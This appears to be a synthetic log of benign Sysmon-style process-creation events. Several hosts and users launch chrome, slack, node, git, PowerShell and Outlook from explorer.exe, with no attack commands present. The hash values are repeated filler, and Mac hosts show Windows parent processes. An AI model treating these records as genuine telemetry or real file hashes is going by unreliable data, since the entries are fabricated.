2026-03-12 21:48:30.048,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ae61919adca99001ae61919adca99001ae61919adca99001ae61919adca99
2026-03-12 21:57:43.501,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00047df0e6213f7800047df0e6213f7800047df0e6213f7800047df0e6213f78
2026-03-12 22:05:08.682,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=0010e9b64cff4b260010e9b64cff4b260010e9b64cff4b260010e9b64cff4b26
2026-03-12 22:17:56.438,FIN-WS22,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002086fb42a01922002086fb42a01922002086fb42a01922002086fb42a01922
2026-03-12 22:31:46.980,MAC-DEV-17,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000ac49aad1ec459000ac49aad1ec459000ac49aad1ec459000ac49aad1ec459
2026-03-12 22:36:54.406,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001272aa371d3c89001272aa371d3c89001272aa371d3c89001272aa371d3c89
2026-03-12 22:47:38.659,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=00010860cfa0794d00010860cfa0794d00010860cfa0794d00010860cfa0794d
2026-03-12 23:00:09.111,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006aebfd70d78e70006aebfd70d78e70006aebfd70d78e70006aebfd70d78e7
2026-03-12 23:09:30.230,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=002385ddd573abc8002385ddd573abc8002385ddd573abc8002385ddd573abc8
2026-03-12 23:18:23.420,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000aef418097bd76000aef418097bd76000aef418097bd76000aef418097bd76
2026-03-12 23:22:59.585,FIN-WS22,n.byrd,1,node,"node",explorer.exe,,,SHA256=0021a9eefb13c6d00021a9eefb13c6d00021a9eefb13c6d00021a9eefb13c6d0
2026-03-12 23:36:57.997,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=000528639564c7df000528639564c7df000528639564c7df000528639564c7df
2026-03-12 23:41:49.838,BLD-RUN-02,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001eff84fee8ff2a001eff84fee8ff2a001eff84fee8ff2a001eff84fee8ff2a
2026-03-12 23:55:52.039,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b27fa73350bfd001b27fa73350bfd001b27fa73350bfd001b27fa73350bfd
2026-03-13 00:07:10.899,FIN-WS22,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001291c915878b4d001291c915878b4d001291c915878b4d001291c915878b4d
2026-03-13 00:12:51.741,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000375064cc64ee1000375064cc64ee1000375064cc64ee1000375064cc64ee1
2026-03-13 00:19:32.298,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=0009db3e394107ce0009db3e394107ce0009db3e394107ce0009db3e394107ce
2026-03-13 00:25:30.046,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014c028f4924d7e0014c028f4924d7e0014c028f4924d7e0014c028f4924d7e
2026-03-13 00:39:51.721,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000a89ebe5695a59000a89ebe5695a59000a89ebe5695a59000a89ebe5695a59
2026-03-13 00:46:06.580,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0015bb018ea6876a0015bb018ea6876a0015bb018ea6876a0015bb018ea6876a
2026-03-13 01:00:03.218,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=000fe9e66e3f3cad000fe9e66e3f3cad000fe9e66e3f3cad000fe9e66e3f3cad
2026-03-13 01:03:11.287,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001a3b6f559c7890001a3b6f559c7890001a3b6f559c7890001a3b6f559c7890
2026-03-13 01:10:25.891,BLD-RUN-02,m.sato,1,node,"node",explorer.exe,,,SHA256=00034d1e058bda3a00034d1e058bda3a00034d1e058bda3a00034d1e058bda3a
2026-03-13 01:20:42.816,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001046e786ad40cf001046e786ad40cf001046e786ad40cf001046e786ad40cf
2026-03-13 01:27:36.849,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=0003cd9f8ea9664f0003cd9f8ea9664f0003cd9f8ea9664f0003cd9f8ea9664f
2026-03-13 01:34:27.010,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00152930bd697ed400152930bd697ed400152930bd697ed400152930bd697ed4
2026-03-13 01:40:19.965,FIN-WS31,n.byrd,1,node,"node",explorer.exe,,,SHA256=001ddd9cb28e95f5001ddd9cb28e95f5001ddd9cb28e95f5001ddd9cb28e95f5
2026-03-13 01:44:25.569,FIN-WS22,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000df1e0d7220bb1000df1e0d7220bb1000df1e0d7220bb1000df1e0d7220bb1
2026-03-13 01:56:03.405,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002073a3b0e847f0002073a3b0e847f0002073a3b0e847f0002073a3b0e847f0
2026-03-13 02:10:53.953,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001229d59395df08001229d59395df08001229d59395df08001229d59395df08
2026-03-13 02:19:12.592,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0002f656913eae840002f656913eae840002f656913eae840002f656913eae84
2026-03-13 02:29:24.492,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001577e821e3bfb3001577e821e3bfb3001577e821e3bfb3001577e821e3bfb3
2026-03-13 02:40:00.109,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ada0dc031d1e3001ada0dc031d1e3001ada0dc031d1e3001ada0dc031d1e3
2026-03-13 02:45:29.359,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000c1a9cf77f135d000c1a9cf77f135d000c1a9cf77f135d000c1a9cf77f135d
2026-03-13 02:53:48.718,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000b209f40bb8f6b000b209f40bb8f6b000b209f40bb8f6b000b209f40bb8f6b
2026-03-13 03:08:22.139,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=002042f41c6f2f6a002042f41c6f2f6a002042f41c6f2f6a002042f41c6f2f6a
2026-03-13 03:19:26.911,MAC-DEV-04,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0005bf1d0bc521340005bf1d0bc521340005bf1d0bc521340005bf1d0bc52134
2026-03-13 03:25:00.117,MAC-DEV-04,a.velasquez,1,node,"node",explorer.exe,,,SHA256=00148c8c5974900c00148c8c5974900c00148c8c5974900c00148c8c5974900c
2026-03-13 03:29:47.049,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00127ea953690a6d00127ea953690a6d00127ea953690a6d00127ea953690a6d
2026-03-13 03:35:15.670,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=0000378dfc9c5e920000378dfc9c5e920000378dfc9c5e920000378dfc9c5e92
2026-03-13 03:46:02.807,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=000bf2b31d41d093000bf2b31d41d093000bf2b31d41d093000bf2b31d41d093
2026-03-13 03:56:28.208,BLD-RUN-02,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0002b27b3a1c46250002b27b3a1c46250002b27b3a1c46250002b27b3a1c4625
2026-03-13 04:07:44.216,MAC-DEV-17,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001556b0a7237e99001556b0a7237e99001556b0a7237e99001556b0a7237e99
2026-03-13 04:15:51.590,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=000e36870533ce88000e36870533ce88000e36870533ce88000e36870533ce88
2026-03-13 04:26:33.709,MAC-DEV-17,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00152dfe81f15e6f00152dfe81f15e6f00152dfe81f15e6f00152dfe81f15e6f
2026-03-13 04:34:29.654,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013431cac47dea90013431cac47dea90013431cac47dea90013431cac47dea9
2026-03-13 04:48:14.076,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0011ff06bceaee8a0011ff06bceaee8a0011ff06bceaee8a0011ff06bceaee8a
2026-03-13 05:01:48.199,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001bbb8fab94b4f7001bbb8fab94b4f7001bbb8fab94b4f7001bbb8fab94b4f7
2026-03-13 05:14:17.788,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007a22a7f86ac5f0007a22a7f86ac5f0007a22a7f86ac5f0007a22a7f86ac5f
2026-03-13 05:26:39.140,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0009eb20984c21da0009eb20984c21da0009eb20984c21da0009eb20984c21da
2026-03-13 05:33:35.586,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=000a53a9c64229ee000a53a9c64229ee000a53a9c64229ee000a53a9c64229ee
2026-03-13 05:37:55.441,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00228ce8310030cc00228ce8310030cc00228ce8310030cc00228ce8310030cc
2026-03-13 05:50:29.235,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002192225afedbc8002192225afedbc8002192225afedbc8002192225afedbc8
2026-03-13 05:56:27.516,FIN-WS31,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001e6a1741c53ed0001e6a1741c53ed0001e6a1741c53ed0001e6a1741c53ed0
2026-03-13 05:59:37.689,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=000f0f2aac286e46000f0f2aac286e46000f0f2aac286e46000f0f2aac286e46
2026-03-13 06:04:56.849,FIN-WS31,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001b2073f0e1d16d001b2073f0e1d16d001b2073f0e1d16d001b2073f0e1d16d
2026-03-13 06:12:56.385,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001a0384d5b90bbc001a0384d5b90bbc001a0384d5b90bbc001a0384d5b90bbc
2026-03-13 06:25:34.354,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=0017fb2458f0e74f0017fb2458f0e74f0017fb2458f0e74f0017fb2458f0e74f
2026-03-13 06:31:44.650,MAC-DEV-17,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0001347e100222ee0001347e100222ee0001347e100222ee0001347e100222ee
2026-03-13 06:39:53.261,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0006f0d49af804300006f0d49af804300006f0d49af804300006f0d49af80430
2026-03-13 06:48:25.123,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=000dcbfca929bc1f000dcbfca929bc1f000dcbfca929bc1f000dcbfca929bc1f
2026-03-13 07:03:12.750,FIN-WS31,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00166e97c02a73d600166e97c02a73d600166e97c02a73d600166e97c02a73d6
2026-03-13 07:09:00.280,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0021de89403f94600021de89403f94600021de89403f94600021de89403f9460
2026-03-13 07:12:43.011,MAC-DEV-17,l.chen,1,node,"node",explorer.exe,,,SHA256=000520693e663c08000520693e663c08000520693e663c08000520693e663c08
2026-03-13 07:16:33.532,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=00086951c091da0e00086951c091da0e00086951c091da0e00086951c091da0e
2026-03-13 07:20:58.562,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000b74bc459683f9000b74bc459683f9000b74bc459683f9000b74bc459683f9
2026-03-13 07:25:04.479,FIN-WS31,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00197e4bcca7d2b200197e4bcca7d2b200197e4bcca7d2b200197e4bcca7d2b2
2026-03-13 07:38:08.256,BLD-RUN-02,t.owens,1,node,"node",explorer.exe,,,SHA256=00099be4c728e77d00099be4c728e77d00099be4c728e77d00099be4c728e77d
2026-03-13 07:44:18.699,BLD-RUN-02,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0023754db2f6b9820023754db2f6b9820023754db2f6b9820023754db2f6b982
2026-03-13 07:49:31.268,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=0011fcf353e0cef30011fcf353e0cef30011fcf353e0cef30011fcf353e0cef3
2026-03-13 08:04:10.547,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=00201cfbc789176600201cfbc789176600201cfbc789176600201cfbc7891766
2026-03-13 08:13:32.161,FIN-WS31,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00178e72191c88de00178e72191c88de00178e72191c88de00178e72191c88de
2026-03-13 08:17:11.633,MAC-DEV-17,m.sato,1,git,"git",explorer.exe,,,SHA256=000f488291318033000f488291318033000f488291318033000f488291318033
2026-03-13 08:31:48.636,FIN-WS31,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001b325f6f841875001b325f6f841875001b325f6f841875001b325f6f841875
2026-03-13 08:35:26.694,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00100d2c7b07566500100d2c7b07566500100d2c7b07566500100d2c7b075665
2026-03-13 08:46:26.601,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b00c8e2ec84b7001b00c8e2ec84b7001b00c8e2ec84b7001b00c8e2ec84b7
2026-03-13 08:56:51.223,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00116087c233c5b900116087c233c5b900116087c233c5b900116087c233c5b9
2026-03-13 09:05:52.379,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014851a3d577dc30014851a3d577dc30014851a3d577dc30014851a3d577dc3
2026-03-13 09:14:20.177,FIN-WS31,n.byrd,1,node,"node",explorer.exe,,,SHA256=001e63ced7aade44001e63ced7aade44001e63ced7aade44001e63ced7aade44
2026-03-13 09:19:05.074,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000d2abdac797a86000d2abdac797a86000d2abdac797a86000d2abdac797a86
2026-03-13 09:25:43.177,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0000ea1bcd676cf80000ea1bcd676cf80000ea1bcd676cf80000ea1bcd676cf8
2026-03-13 09:40:17.009,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0008bd522e008f010008bd522e008f010008bd522e008f010008bd522e008f01
2026-03-13 09:52:57.526,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000d183da98f2bc8000d183da98f2bc8000d183da98f2bc8000d183da98f2bc8
2026-03-13 10:01:50.531,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001f2ff331f03bac001f2ff331f03bac001f2ff331f03bac001f2ff331f03bac
2026-03-13 10:10:44.881,BLD-RUN-02,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000a1a954233fabc000a1a954233fabc000a1a954233fabc000a1a954233fabc
2026-03-13 10:19:49.053,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=000e054d655be8c8000e054d655be8c8000e054d655be8c8000e054d655be8c8
2026-03-13 10:30:29.271,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=0015cbd4523054b00015cbd4523054b00015cbd4523054b00015cbd4523054b0
2026-03-13 10:43:42.780,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0021c645f9b6b4a00021c645f9b6b4a00021c645f9b6b4a00021c645f9b6b4a0
2026-03-13 10:53:32.109,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00198a6fb3f1eda100198a6fb3f1eda100198a6fb3f1eda100198a6fb3f1eda1
2026-03-13 11:04:58.825,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022c6f0f06041fe0022c6f0f06041fe0022c6f0f06041fe0022c6f0f06041fe
2026-03-13 11:08:02.621,MAC-DEV-17,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000846e3fcd4adaf000846e3fcd4adaf000846e3fcd4adaf000846e3fcd4adaf
2026-03-13 11:12:05.177,MAC-DEV-04,n.byrd,1,node,"node",explorer.exe,,,SHA256=000c2a45fa975c69000c2a45fa975c69000c2a45fa975c69000c2a45fa975c69
2026-03-13 11:21:18.529,MAC-DEV-17,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001fac7af42adb37001fac7af42adb37001fac7af42adb37001fac7af42adb37
2026-03-13 11:31:21.952,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00009435882f21e600009435882f21e600009435882f21e600009435882f21e6
2026-03-13 11:45:40.529,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0010f5f1b3328fb90010f5f1b3328fb90010f5f1b3328fb90010f5f1b3328fb9
2026-03-13 11:54:25.279,FIN-WS31,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00157a21d9aafe4d00157a21d9aafe4d00157a21d9aafe4d00157a21d9aafe4d
2026-03-13 12:08:33.942,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0010b834d6dd56650010b834d6dd56650010b834d6dd56650010b834d6dd5665
2026-03-13 12:17:02.831,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=00116b433afeb27500116b433afeb27500116b433afeb27500116b433afeb275
2026-03-13 12:28:20.588,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ecd61cf736082001ecd61cf736082001ecd61cf736082001ecd61cf736082
2026-03-13 12:42:39.148,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001c2fa9d139f1c4001c2fa9d139f1c4001c2fa9d139f1c4001c2fa9d139f1c4
2026-03-13 12:50:22.183,FIN-WS31,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00150bfd35b6e30d00150bfd35b6e30d00150bfd35b6e30d00150bfd35b6e30d
2026-03-13 13:04:27.201,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00049c7717d662e500049c7717d662e500049c7717d662e500049c7717d662e5
2026-03-13 13:17:02.175,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=000b5c7c0b8a4242000b5c7c0b8a4242000b5c7c0b8a4242000b5c7c0b8a4242
2026-03-13 13:29:23.998,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0011b50f0a4c14b20011b50f0a4c14b20011b50f0a4c14b20011b50f0a4c14b2
2026-03-13 13:39:34.629,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003a818259c7aef0003a818259c7aef0003a818259c7aef0003a818259c7aef
2026-03-13 13:53:26.032,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0000a21737054e8e0000a21737054e8e0000a21737054e8e0000a21737054e8e
2026-03-13 14:02:25.310,MAC-DEV-17,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000db671be720ebc000db671be720ebc000db671be720ebc000db671be720ebc
2026-03-13 14:09:18.869,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b58eb33f91bd4001b58eb33f91bd4001b58eb33f91bd4001b58eb33f91bd4
2026-03-13 14:19:30.260,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000fd01fa8de67d1000fd01fa8de67d1000fd01fa8de67d1000fd01fa8de67d1
2026-03-13 14:28:27.908,MAC-DEV-17,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000842d065e59bf3000842d065e59bf3000842d065e59bf3000842d065e59bf3
2026-03-13 14:31:39.640,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0011092b658f81800011092b658f81800011092b658f81800011092b658f8180
2026-03-13 14:35:08.009,FIN-WS31,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b7879cdc20d79001b7879cdc20d79001b7879cdc20d79001b7879cdc20d79
2026-03-13 14:38:48.181,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00075d025c8376de00075d025c8376de00075d025c8376de00075d025c8376de
2026-03-13 14:53:12.089,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022952f2c22481a0022952f2c22481a0022952f2c22481a0022952f2c22481a
2026-03-13 15:04:17.002,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=0008c90c1e3db56f0008c90c1e3db56f0008c90c1e3db56f0008c90c1e3db56f
2026-03-13 15:18:16.671,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008ec067338fa730008ec067338fa730008ec067338fa730008ec067338fa73
2026-03-13 15:26:33.580,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015414ab12fc94e0015414ab12fc94e0015414ab12fc94e0015414ab12fc94e
2026-03-13 15:31:49.447,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001f2070b34a1220001f2070b34a1220001f2070b34a1220001f2070b34a1220
2026-03-13 15:46:15.994,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001093dbd563597f001093dbd563597f001093dbd563597f001093dbd563597f
2026-03-13 15:52:03.984,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=00042644379a494f00042644379a494f00042644379a494f00042644379a494f
2026-03-13 16:00:53.029,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000cf86e16b0c646000cf86e16b0c646000cf86e16b0c646000cf86e16b0c646
2026-03-13 16:10:53.463,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0010a7ebb17a7b0b0010a7ebb17a7b0b0010a7ebb17a7b0b0010a7ebb17a7b0b
2026-03-13 16:24:42.003,FIN-WS31,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003f8742d6540be0003f8742d6540be0003f8742d6540be0003f8742d6540be
2026-03-13 16:27:52.617,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001b099fca3227c4001b099fca3227c4001b099fca3227c4001b099fca3227c4
2026-03-13 16:35:30.090,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00209f6672d1f20000209f6672d1f20000209f6672d1f20000209f6672d1f200
2026-03-13 16:49:38.467,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=00229302384c0de000229302384c0de000229302384c0de000229302384c0de0
2026-03-13 16:58:41.114,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00110cd86388319b00110cd86388319b00110cd86388319b00110cd86388319b
2026-03-13 17:10:49.902,FIN-WS22,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001fed32079bf668001fed32079bf668001fed32079bf668001fed32079bf668
2026-03-13 17:20:07.141,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001832ce8264ae2e001832ce8264ae2e001832ce8264ae2e001832ce8264ae2e
2026-03-13 17:32:57.314,FIN-WS22,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002018a7222563f8002018a7222563f8002018a7222563f8002018a7222563f8
2026-03-13 17:47:21.342,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0012628b506918620012628b506918620012628b506918620012628b50691862
2026-03-13 17:53:50.100,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00012cb537d9c2a700012cb537d9c2a700012cb537d9c2a700012cb537d9c2a7
2026-03-13 18:05:34.374,FIN-WS22,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0020fb2f24c0279a0020fb2f24c0279a0020fb2f24c0279a0020fb2f24c0279a
2026-03-13 18:19:25.679,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0005e7df8251998d0005e7df8251998d0005e7df8251998d0005e7df8251998d
2026-03-13 18:33:09.629,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=001a2ff3a3040107001a2ff3a3040107001a2ff3a3040107001a2ff3a3040107
2026-03-13 18:45:02.522,BLD-RUN-02,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ecffac6eb22f6001ecffac6eb22f6001ecffac6eb22f6001ecffac6eb22f6
2026-03-13 18:52:01.898,BLD-RUN-02,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016594a8901f5100016594a8901f5100016594a8901f5100016594a8901f510
2026-03-13 19:03:15.158,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0015d681ed5226990015d681ed5226990015d681ed5226990015d681ed522699
2026-03-13 19:07:48.040,MAC-DEV-17,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000d021aa9d17c26000d021aa9d17c26000d021aa9d17c26000d021aa9d17c26
2026-03-13 19:12:05.169,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008808863730946000880886373094600088088637309460008808863730946
2026-03-13 19:21:45.887,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000229b525f22b7e000229b525f22b7e000229b525f22b7e000229b525f22b7e
2026-03-13 19:34:52.373,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000938c588dc4fe2000938c588dc4fe2000938c588dc4fe2000938c588dc4fe2
2026-03-13 19:41:27.592,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=0015ee52d28e53490015ee52d28e53490015ee52d28e53490015ee52d28e5349
2026-03-13 19:54:38.585,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e9078d0575fb6000e9078d0575fb6000e9078d0575fb6000e9078d0575fb6
2026-03-13 20:09:14.702,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00077388997ceb5b00077388997ceb5b00077388997ceb5b00077388997ceb5b
2026-03-13 20:15:36.252,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0014fec50978a4500014fec50978a4500014fec50978a4500014fec50978a450
2026-03-13 20:25:13.161,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0007e17ddbd6b06a0007e17ddbd6b06a0007e17ddbd6b06a0007e17ddbd6b06a
2026-03-13 20:33:09.619,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001bc349e3ed838b001bc349e3ed838b001bc349e3ed838b001bc349e3ed838b
2026-03-13 20:36:35.943,MAC-DEV-17,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007dfedb4f2ab470007dfedb4f2ab470007dfedb4f2ab470007dfedb4f2ab47
2026-03-13 20:43:40.688,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001957464afd3a81001957464afd3a81001957464afd3a81001957464afd3a81
2026-03-13 20:49:47.903,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015e3c2d80d1cbb0015e3c2d80d1cbb0015e3c2d80d1cbb0015e3c2d80d1cbb
2026-03-13 21:01:49.773,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000d514859fcf263000d514859fcf263000d514859fcf263000d514859fcf263
2026-03-13 21:05:40.344,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000efcb3c5f5c3f4000efcb3c5f5c3f4000efcb3c5f5c3f4000efcb3c5f5c3f4
2026-03-13 21:19:24.751,MAC-DEV-04,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008c648c13ba29d0008c648c13ba29d0008c648c13ba29d0008c648c13ba29d
